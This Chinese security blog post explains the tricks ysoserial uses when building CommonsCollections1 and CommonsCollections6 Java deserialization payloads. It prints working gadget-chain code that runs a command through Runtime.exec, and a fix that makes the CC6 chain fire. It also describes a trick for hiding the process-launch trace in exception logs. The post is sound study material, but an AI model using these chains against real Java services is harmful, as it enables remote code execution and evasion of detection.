@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Java篇之ysoserial中的一些操作 | Welcome to Arsene.Tang &#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+    <meta name="description" content="web安全">
+  
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Welcome to Arsene.Tang 's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/localshare/css/share.css">
+
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Welcome to Arsene.Tang &#39;s Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">一个喜欢web安全但菜的离谱的萌新</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/."><i class="fa fa-home"></i> 首页</a>
+        
+          <a class="main-nav-link" href="/archives/"><i class="fa fa-archive"></i> 归档</a>
+        
+          <a class="main-nav-link" href="/about/"><i class="fa fa-user"></i> 关于</a>
+        
+          <a class="main-nav-link" href="/atom.xml"><i class="fa fa-rss"></i> 订阅</a>
+        
+      </nav>
+    </div>
+    <div id="search-form">
+      <div id="result-mask" class="hide"></div>
+      <label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label>
+      <div id="result-wrap" class="hide">
+        <div id="search-result"></div>
+      </div>
+      <div class="hide">
+        <template id="search-tpl">
+          <div class="item">
+            <a href="/{path}" title="{title}">
+              <div class="title">{title}</div>
+              <div class="time">{date}</div>
+              <div class="tags">{tags}</div>
+            </a>
+          </div>
+        </template>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Java篇之ysoserial中的一些操作" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Java篇之ysoserial中的一些操作
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2022-02-13T16:00:00.000Z" itemprop="datePublished">2022年02月14日</time>
+</span>
+      
+      
+        <span class="article-views">
+  <i class="fa fa-views"></i>
+  <i id="busuanzi_container_page_pv">
+      <i id="busuanzi_value_page_pv"></i>
+  </i>
+</span>
+
+      
+      
+<a href="/2022/02/14/Java%E7%AF%87%E4%B9%8Bysoserial%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/#comments" class="article-comment-link">
+  
+    
+    
+    
+    
+    
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ysoserial中的一些操作"><a href="#ysoserial中的一些操作" class="headerlink" title="ysoserial中的一些操作"></a>ysoserial中的一些操作</h1><p>前面我们分析了cc1和cc6，但当我们去看<code>ysoserial</code>中时，会发现它里面有一些其它的操作，这篇文章我们就来看看这些操作的目的以及它所起到的作用</p>
+<span id="more"></span>
+
+<h2 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h2><p>我们先来看看<code>ysoserial</code>中cc1的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.JavaVersion;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest</span> ( precondition = <span class="string">&quot;isApplicableJavaVersion&quot;</span>)</span><br><span class="line"><span class="meta">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">InvocationHandler</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">		<span class="comment">// inert chain for setup</span></span><br><span class="line">		<span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">			<span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">		<span class="comment">// real chain for after setup</span></span><br><span class="line">		<span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">					String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">					<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">					Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">					<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">					<span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">		Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); </span><br><span class="line">        <span class="comment">// arm with actual transformer chain 最后才将真正具有危害的Transformer数组设置进去</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> handler;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		PayloadRunner.run(CommonsCollections1.class, args);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到它里面封装了很多方法，很多我们在这里面是看不到的，但原理和前面我们讲的是一样的，但是它刚开始创建的那个<code>Transformer[]</code>是什么呢，里面的<code>new ConstantTransformer(1)</code>好像也没有实质性的意义，而下面那个<code>Transformer[]</code>才是我们真正需要的<code>Transformer[]</code>，那为什么我们前面要放一个假的<code>Transformer[]</code>呢？这是因为我们在使用了<code>Proxy</code>代理了<code>map</code>对象时，我们在任何地方执行<code>map</code>的方法时，都会触发<code>Proxy#invoke</code>，从而执行命令弹出计算器，这就会导致我们在<strong>调试</strong>代码的时候，有时甚至还没有执行到<code>readObject</code>就已经弹出了计算器，这是因为调试器会在下面调用一些<code>toString</code>之类的方法，导致不经意间就触发了命令</p>
+<p>所以说<code>ysoserial</code>对此做出的处理就是最后才会将真正执行命令的<code>Transformer</code>数组设置进<code>transformerChain</code>里面去，而前面的就是假的，避免本地生成序列化流的程序执行到命令，而设置的方法就是利用反射，我们看看代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reflections</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">		field.set(obj, value);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">	    field = clazz.getDeclaredField(fieldName);</span><br><span class="line">	    setAccessible(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> field;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而在<code>ChainedTransformer</code>中存放<code>Transformer</code>数组的变量名就是<code>iTransformers</code>，所以说通过<code>Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);</code>就把真正的<code>Transformer</code>数组设置进去了</p>
+<p>而还有一点就是，<code>ysoserial</code>中的<code>Transformed</code>数组最后增加了一个<code>new ConstantTransformer(1)</code>，这是为什么呢？</p>
+<p><img src="https://s2.loli.net/2022/02/14/p7ETcRrI213SB5m.png" alt="image.png"></p>
+<p>其实这一点我也不太清楚，因为我认为无论有没有这个都是不会影响命令的正常执行的，删掉也无伤大雅，但我看p神文章，p神的猜测是可能是为了隐藏异常日志中的一些信息；因为如果这里没有<code>ConstantTransformer(1)</code>，命令进程对象将会被 <code>LazyMap#get</code> 返回，导致我们在异常信息里能看到这个特征，我们先看没有<code>ConstantTransformer(1)</code>的情况：</p>
+<p><img src="https://s2.loli.net/2022/02/14/m71EaBHerNyou39.png" alt="image.png"></p>
+<p>如果我们增加一个 <code>ConstantTransformer(1)</code> 在<code>TransformChain</code>的末尾，异常信息将会变成 java.lang.Integer cannot be cast to java.util.Set ，隐蔽了启动进程的日志特征：</p>
+<p><img src="https://s2.loli.net/2022/02/14/NIGoPfUe91gOB8v.png" alt="image.png"></p>
+<h2 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h2><p>而在cc6中，我们同样可以像cc1一样，首先添加一个假的<code>Transformer</code>数组，然后最后再将真正有危害的添加进去，这样可以避免许多问题，事实上<code>ysoserial</code>确实也是这么做的，而且后面也有隐藏异常日志的<code>ConstantTransformer(1)</code>操作，只不过由于我们的链子和<code>ysoserial</code>上给的不完全一样，所以说这次就不按照<code>ysoserial</code>上的分析了；但当我们加上假的<code>Transformer</code>数组，后面再变成真的之后，会发现一个问题，那就是命令并没有执行，看下面这段代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class&#125;, <span class="keyword">new</span> String[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>),&#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(faketransformers);</span><br><span class="line">        <span class="comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看起来没有任何问题，那我们点运行：</p>
+<p><img src="https://s2.loli.net/2022/02/14/hnlJoDFaf6svqBT.png" alt="image.png"></p>
+<p>什么也没有发生，并没有弹出计算器，这是为什么呢，来单步调试看看，看它有没有正常执行<code>transform</code>：</p>
+<p><img src="https://s2.loli.net/2022/02/14/TxNoOWeqSXBrgHb.png" alt="image.png"></p>
+<p>这里就出现问题了，这里<code>map.containsKey(key)</code>得为假才能进入<code>if</code>语句，但是这里已经告诉了我们，<code>super.map.containsKey(key)</code>为true，那就意味着它这儿没有正常进入<code>transform</code>中，那当然就执行不了命令了</p>
+<p>其实在单步调试的过程中，我们可以看到，这里的问题出在<code>expMap.put(tme, &quot;valuevalue&quot;);</code>，而这个<code>put</code>方法中，又正好拥有<code>hash(key)</code>方法，那么我们回忆一下cc6的链子，这链子是不是就已经连上了，相当于本地触发了；而我们第一次传入的是<code>faketransformers</code>，这个时候<code>super.map.containsKey(key)</code>是为false的，是正常的，问题就是它进入了之后，执行了<code>super.map.put()</code>操作，这就出问题了呀，把我们key为<code>keykey</code>的对象放进去了，导致第二次，我们真正的<code>transformers</code>传进来之后，利用反序列化触发时，它就为true了，也就没办法触发了</p>
+<p>用p神的话说，这⾥就导致<code>LazyMap</code>这个利⽤链在前面就已经被调⽤了⼀遍，因为我前⾯⽤了<code>fakeTransformers</code> ，所以此时并没有触发命令执⾏，但实际上也对我们构造Payload产⽣了影响</p>
+<p>这里的解决方法也就很简单，只需要将这个<code>Key</code>，再从<code>outerMap</code>中移除即可： <code>outerMap.remove(&quot;keykey&quot;)</code></p>
+<p><img src="https://s2.loli.net/2022/02/14/NS3i1ufwmVRjJY2.png" alt="image.png"></p>
+<p>完美操作，成功，弹出计算器哈哈哈</p>
+
+        
+            <div id="toc-article">
+                
+  <div class="widget-wrap" id="toc-wrap">
+    <h3 class="widget-title"><i class="fa fa-toc"></i> 文章目录</h3>
+    <div class="widget">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ysoserial%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C"><span class="toc-text">ysoserial中的一些操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cc1"><span class="toc-text">cc1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cc6"><span class="toc-text">cc6</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+
+            </div>
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://arsenetang.github.io/2022/02/14/Java篇之ysoserial中的一些操作/">https://arsenetang.github.io/2022/02/14/Java篇之ysoserial中的一些操作/</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li></ul>
+
+          
+    <div class="social-share">
+      <span>分享到:</span>
+    </div>
+
+
+
+        </div>
+      
+      
+        
+<nav id="article-nav">
+  
+    <a href="/2022/02/14/Java%E7%AF%87%E4%B9%8BCommonsCollections%206/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">newer</strong>
+      <div class="article-nav-title">
+        
+          Java篇Commons-Collections 6
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/02/09/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(3)/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">older</strong>
+      <div class="article-nav-title">Java篇Commons-Collections 1 (3)</div>
+    </a>
+  
+</nav>
+
+      
+      
+        
+
+
+
+
+
+
+
+      
+    </footer>
+  </div>
+</article>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-posts"></i> 最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/02/14/Java%E7%AF%87%E4%B9%8BCommonsCollections%206/">Java篇Commons-Collections 6</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/14/Java%E7%AF%87%E4%B9%8Bysoserial%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/">Java篇之ysoserial中的一些操作</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/09/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(3)/">Java篇Commons-Collections 1 (3)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/06/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(2)/">Java篇Commons-Collections 1 (2)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/03/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(1)/">Java篇Commons-Collections 1 (1)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-tag"></i> 标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/Java/" style="font-size: 16.67px;">Java</a> <a href="/tags/RCE/" style="font-size: 13.33px;">RCE</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Web安全</a> <a href="/tags/ctf/" style="font-size: 18.33px;">ctf</a> <a href="/tags/php/" style="font-size: 16.67px;">php</a> <a href="/tags/wp/" style="font-size: 11.67px;">wp</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15px;">反序列化</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
+    </div>
+  </div>
+
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-archive"></i> 归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022年02月</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021年11月</a><span class="archive-list-count">19</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-tag"></i> 标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWD/" rel="tag">AWD</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a><span class="tag-list-count">17</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-link"></i> 友情链接</h3>
+    <div class="widget">
+      <ul>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://blog.csdn.net/ATFWUS">ATFWUS</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.darry-long.top/">darry</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn">eeee</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://fmyyy.gitee.io/">fmyyy</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://101.34.46.94/ple3.com/">g1ory</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://jev0n.com/">Jev0n</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://l61q4cheng.github.io/">L61q4_Cheng</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://le1a.com/">le1a</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://l0v3ming.github.io/">l0v3ming</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://mochu.blog.csdn.net">mochu7</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46330722">NoViC4</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://blog.o3ev.cn/">o3Ev</a>
+        </li>
+      
+        <li>
